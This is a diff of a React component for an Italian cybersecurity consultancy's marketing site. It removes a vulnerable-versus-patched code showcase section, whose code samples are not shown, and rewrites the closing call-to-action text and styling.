+                  background: buyer.badgeColor,
+                  color: buyer.badgeColor === PALETTE.ink ? PALETTE.bg : "#ffffff",
+                  fontFamily: DISPLAY_FONT,
+                  fontSize: "1.25rem",
+                  letterSpacing: "0.02em",
+                  textTransform: "uppercase",
+                  textDecoration: "none",
+                  borderRadius: 0,
+                }}
+              >
+                {buyer.cta} →
+              </Link>
             </div>
           </div>
         </div>
       </section>
 
       {/* =====================================================================
-       * SCHERMATA 5 — MANIFESTI WIDESCREEN & DIFF REMEDIATION ([RETOOL]/[ADAPT]/[EVOLVE])
-       * =================================================================== */}
-      <section aria-label="Casi studio widescreen e Diff Vulnerabile vs Patchato">
-        {DIFF_BANDS.map((band, idx) => {
-          const mode = diffStates[idx] ?? "patch";
-          return (
-            <div
-              key={band.word}
-              style={{
-                background: band.bg,
-                color: band.fg,
-                borderBottom: `2px solid ${PALETTE.bg}`,
-                padding: "clamp(36px, 6vw, 72px) clamp(20px, 4vw, 48px)",
-              }}
-            >
-              <div
-                style={{
-                  maxWidth: "1280px",
-                  margin: "0 auto",
-                  display: "grid",
-                  gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))",
-                  alignItems: "center",
-                  gap: "32px",
-                }}
-              >
-                {/* Parte SX: Solido 3D nero dithered con badge sovrapposto come 1:22–1:28 */}
-                <div
-                  style={{
-                    position: "relative",
-                    display: "flex",
-                    alignItems: "center",
-                    justifyContent: "center",
-                    minHeight: "260px",
-                  }}
-                >
-                  <PixelDitherCanvas
-                    kind={band.scene}
-                    color={PALETTE.bg}
-                    width={420}
-                    height={280}
-                    cellSize={5}
-                    style={{ width: "100%", maxWidth: "420px", height: "auto" }}
-                  />
-                  <div style={{ position: "absolute", left: "10%", top: "50%", transform: "translateY(-50%)" }}>
-                    <PixelDissolveBadge
-                      text={band.word}
-                      bg={band.badgeBg}
-                      fg={band.badgeFg}
-                      fontSize="clamp(2.4rem, 5vw, 4.2rem)"
-                      padding="0.1em 0.28em"
-                    />
-                  </div>
-                </div>
-
-                {/* Parte DX: Caso Studio Reale + Ispettore Codice Vulnerabile/Patchato */}
-                <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
-                  <div style={{ fontSize: "11px", fontWeight: 700, letterSpacing: "0.08em" }}>
-                    {band.caseTag}
-                  </div>
-                  <h3
-                    style={{
-                      margin: 0,
-                      fontFamily: DISPLAY_FONT,
-                      fontSize: "clamp(1.8rem, 3.2vw, 2.6rem)",
-                      lineHeight: 0.96,
-                      textTransform: "uppercase",
-                    }}
-                  >
-                    {band.title}
-                  </h3>
-                  <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.55, opacity: 0.92 }}>
-                    {band.summary}
-                  </p>
-
-                  {/* Switch Vulnerabile vs Patchato */}
-                  <div style={{ display: "flex", gap: "8px", marginTop: "4px" }}>
-                    <button
-                      type="button"
-                      onClick={() => setDiffStates((s) => ({ ...s, [idx]: "vuln" }))}
-                      style={{
-                        padding: "7px 12px",
-                        fontSize: "11px",
-                        fontFamily: MONO_FONT,
-                        fontWeight: 700,
-                        background: mode === "vuln" ? PALETTE.bg : "transparent",
-                        color: mode === "vuln" ? PALETTE.red : PALETTE.bg,
-                        border: `1.5px solid ${PALETTE.bg}`,
-                        borderRadius: 0,
-                        cursor: "pointer",
-                      }}
-                    >
-                      [!] CODICE VULNERABILE
-                    </button>
-                    <button
-                      type="button"
-                      onClick={() => setDiffStates((s) => ({ ...s, [idx]: "patch" }))}
-                      style={{
-                        padding: "7px 12px",
-                        fontSize: "11px",
-                        fontFamily: MONO_FONT,
-                        fontWeight: 700,
-                        background: mode === "patch" ? PALETTE.bg : "transparent",
-                        color: mode === "patch" ? PALETTE.ink : PALETTE.bg,
-                        border: `1.5px solid ${PALETTE.bg}`,
-                        borderRadius: 0,
-                        cursor: "pointer",
-                      }}
-                    >
-                      [✓] FIX / REMEDIATION PRONTA
-                    </button>
-                  </div>
-
-                  <pre
-                    style={{
-                      margin: 0,
-                      padding: "16px",
-                      background: PALETTE.bg,
-                      color: mode === "vuln" ? "#ff7a98" : "#d9d8dc",
-                      border: `1px solid ${PALETTE.bg}`,
-                      fontFamily: MONO_FONT,
-                      fontSize: "12px",
-                      lineHeight: 1.5,
-                      overflowX: "auto",
-                      borderRadius: 0,
-                    }}
-                  >
-                    <code>{mode === "vuln" ? band.vulnerableCode : band.patchedCode}</code>
-                  </pre>
-                </div>
-              </div>
-            </div>
-          );
-        })}
-      </section>
-
-      {/* =====================================================================
-       * SCHERMATA 6 — FINALE AD ALTO CONTRASTO ("Welcome to the -> SEC.OLUTION")
+       * 06 — LA CONCLUSIONE ("IL PROSSIMO ATTACCO NON TI AVVISERÀ.")
        * =================================================================== */}
       <section
-        aria-label="Finale e Prenotazione Scoping sotto NDA"
+        id="conclusione"
+        aria-label="Dalla consapevolezza all'azione"
         style={{
           background: PALETTE.ink,
           color: PALETTE.bg,
@@ -2698,7 +2900,7 @@ export function LaraconCybersecSite() {
           display: "flex",
           flexDirection: "column",
           justifyContent: "space-between",
-          padding: "clamp(48px, 7vw, 88px) clamp(20px, 4vw, 48px) 0 clamp(20px, 4vw, 48px)",
+          padding: "clamp(56px, 7vw, 96px) clamp(20px, 4vw, 48px) 0 clamp(20px, 4vw, 48px)",
           overflow: "hidden",
         }}
       >
@@ -2706,7 +2908,7 @@ export function LaraconCybersecSite() {
           style={{
             position: "relative",
             zIndex: 2,
-            maxWidth: "1120px",
+            maxWidth: "920px",
             width: "100%",
             margin: "0 auto",
             textAlign: "center",
@@ -2716,8 +2918,16 @@ export function LaraconCybersecSite() {
             gap: "20px",
           }}
         >
-          <span style={{ fontSize: "13px", letterSpacing: "0.08em", color: PALETTE.bg }}>
-            Welcome to the
+          <span
+            style={{
+              fontSize: "12px",
+              letterSpacing: "0.14em",
+              fontWeight: 700,
+              color: PALETTE.red,
+              textTransform: "uppercase",
+            }}
+          >
+            06 // DALLA CONSAPEVOLEZZA ALL&apos;AZIONE
           </span>
 
           <h2
@@ -2725,65 +2935,40 @@ export function LaraconCybersecSite() {
               margin: 0,
               fontFamily: DISPLAY_FONT,
               fontWeight: 700,
-              fontSize: "clamp(3.6rem, 11vw, 8.8rem)",
-              lineHeight: 0.86,
-              letterSpacing: "-0.03em",
+              fontSize: "clamp(3rem, 8.8vw, 7rem)",
+              lineHeight: 0.9,
+              letterSpacing: "-0.025em",
               textTransform: "uppercase",
               color: PALETTE.bg,
             }}
           >
-            SEC.OLUTION
+            IL PROSSIMO ATTACCO
+            <br />
+            NON TI AVVISERÀ.
           </h2>
 
           <div
             style={{
-              display: "inline-flex",
-              alignItems: "center",
+              display: "flex",
+              flexDirection: "column",
               gap: "12px",
-              flexWrap: "wrap",
-              justifyContent: "center",
+              maxWidth: "60ch",
               marginTop: "6px",
             }}
           >
-            <TypewriterBar
-              text="MATTEODILIBERTO.IT"
-              cursorColor={PALETTE.red}
-              speedMs={50}
-              style={{
-                fontFamily: DISPLAY_FONT,
-                fontWeight: 700,
-                fontSize: "clamp(1.8rem, 4.5vw, 3.2rem)",
-                letterSpacing: "-0.02em",
-                color: PALETTE.bg,
-              }}
-            />
-            <span
-              style={{
-                background: PALETTE.red,
-                color: "#ffffff",
-                fontFamily: DISPLAY_FONT,
-                fontWeight: 700,
-                fontSize: "clamp(1.6rem, 3.8vw, 2.8rem)",
-                padding: "0.06em 0.24em",
-                lineHeight: 0.95,
-              }}
-            >
-              26
-            </span>
+            <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#1B1A1D" }}>
+              Ma questo non significa che tu debba aspettarlo per iniziare a porti le domande giuste.
+            </p>
+            <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#1B1A1D" }}>
+              Sai quali tecnologie sostengono davvero la tua attività? Sai quando sono state verificate l&apos;ultima volta? Sai quali responsabilità di sicurezza e conformità riguardano la tua impresa?
+            </p>
+            <p style={{ margin: "4px 0", fontSize: "15.5px", lineHeight: 1.55, fontWeight: 700, color: PALETTE.bg }}>
+              Non devi conoscere tutte le risposte oggi. Devi sapere da dove iniziare a cercarle.
+            </p>
+            <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#1B1A1D" }}>
+              Raccontami la tua situazione. Possiamo valutare insieme quali aspetti meritano una verifica e quale potrebbe essere il primo passo concreto.
+            </p>
           </div>
-
-          <p
-            style={{
-              margin: "12px auto 0 auto",
-              maxWidth: "54ch",
-              fontSize: "13px",
-              lineHeight: 1.6,
-              color: "#262428",
-            }}
-          >
-            Trenta minuti su Google Meet protetti da NDA per mappare il perimetro, definire le regole
-            d&apos;ingaggio e capire esattamente cosa mettere al sicuro prima del prossimo rilascio.
-          </p>
 
           <div style={{ display: "flex", flexWrap: "wrap", gap: "12px", justifyContent: "center", marginTop: "8px" }}>
             <Link
@@ -2800,7 +2985,7 @@ export function LaraconCybersecSite() {
                 borderRadius: 0,
               }}
             >
-              PRENOTA SESSIONE TECNICA (30 MIN) →
+              Prenota un primo confronto →
             </Link>
             <a
               href={PHONE_NUMBER}
@@ -2819,18 +3004,30 @@ export function LaraconCybersecSite() {
                 alignItems: "center",
               }}
             >
-              CONTATTO DIRETTO
+              Contatto diretto
             </a>
           </div>
+
+          <p
+            style={{
+              margin: "2px 0 0 0",
+              fontSize: "12.5px",
+              lineHeight: 1.5,
+              fontStyle: "italic",
+              color: "#262428",
+            }}
+          >
+            30 minuti per parlare della tua situazione, senza impegno e senza soluzioni preconfezionate.
+          </p>
         </div>
 
-        {/* Sole / Semisfera rossa dithered che sorge dal basso come 1:31–1:33 */}
+        {/* Sole / Semisfera rossa dithered che sorge dal basso */}
         <div
           style={{
             position: "relative",
             zIndex: 1,
             width: "min(640px, 100%)",
-            margin: "24px auto 0 auto",
+            margin: "28px auto 0 auto",
             pointerEvents: "none",
           }}
         >
